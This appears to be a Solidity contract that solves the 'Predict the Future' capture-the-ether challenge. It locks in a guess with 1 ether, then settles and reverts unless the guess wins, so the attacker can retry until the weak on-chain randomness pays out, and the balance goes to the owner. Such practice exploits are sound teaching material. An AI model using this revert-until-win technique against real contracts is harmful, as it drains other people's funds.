// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IPredictTheFutureChallenge {
    function isComplete() external view returns (bool);

    function lockInGuess(uint8 n) external payable;

    function settle() external;
}

contract AttackPredictTheFutureChallenge {
    IPredictTheFutureChallenge challenge;

    address owner;

    constructor(address _contractAddress) {
        challenge = IPredictTheFutureChallenge(_contractAddress);
        owner = msg.sender;
    }

    function lockNumber(uint8 _number) public payable {
        require(msg.value == 1 ether);
        require(
            _number >= 0 && _number <= 9,
            "Number must be in the 0-9 range"
        );

        challenge.lockInGuess{value: 1 ether}(_number);
    }

    function solveChallenge() public {
        challenge.settle();
        // Reverts in case guess != answer
        require(challenge.isComplete(), "Try again");
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success, "sending eth to owner failed");
    }

    receive() external payable {}
}
